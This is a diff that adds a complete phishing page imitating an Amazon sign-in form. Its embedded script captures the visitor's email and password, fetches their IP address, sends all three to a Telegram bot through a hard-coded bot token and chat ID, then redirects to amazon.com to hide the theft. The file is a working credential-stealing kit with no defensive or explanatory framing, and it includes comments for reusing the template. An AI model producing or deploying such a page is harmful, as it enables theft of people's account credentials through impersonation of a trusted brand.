@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Sign-In</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: #f3f3f3;
+      margin: 0;
+      padding: 40px 20px;
+      color: #111;
+    }
+
+    .card {
+      max-width: 480px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 6px;
+      padding: 36px;
+      box-shadow: 0 2px 0 rgba(0,0,0,0.06), 0 6px 20px rgba(0,0,0,0.04);
+    }
+
+    h1 {
+      font-size: 36px;
+      margin: 0 0 20px 0;
+      font-weight: 500;
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-size: 14px;
+    }
+
+    input[type="text"], input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #e6e6e6;
+      border-radius: 6px;
+      font-size: 16px;
+      background: #fff;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #c9c9c9;
+      box-shadow: 0 0 0 3px rgba(0,0,0,0.02);
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      margin-top: 18px;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(0,0,0,0.1);
+      background: linear-gradient(#e6bb57, #d9a93b);
+      font-size: 18px;
+      cursor: pointer;
+      color: #111;
+    }
+
+    .help {
+      margin-top: 18px;
+    }
+
+    .help a {
+      color: #2b6cdf;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Sign-In</h1>
+
+    <form id="telegramForm" autocomplete="off" novalidate>
+      <label for="email">Email or mobile phone number</label>
+      <input id="email" name="email" type="email" required placeholder="name@example.com" />
+
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" required placeholder="Enter password" />
+
+      <button class="btn" type="submit">Continue</button>
+    </form>
+
+    <div class="help">
+      <a href="#">Need help?</a>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8432237669:AAE2GcntVohNVbjG9gEShHugopt2wkJcB9w"; // Replace with your bot token
+    const CHAT_ID = "8198191627"; // Replace with your chat ID
+
+    document.getElementById("telegramForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const message = `🔐 New Login Submission\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}`;
+
+          return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          });
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Redirect after sending
+          window.location.href = "https://www.amazon.com"; // Replace with your redirect URL
+        })
+        .catch(err => {
+          alert("Error sending message.");
+          console.error(err);
+        });
+    });
+  </script>
+</body>
+</html>
+
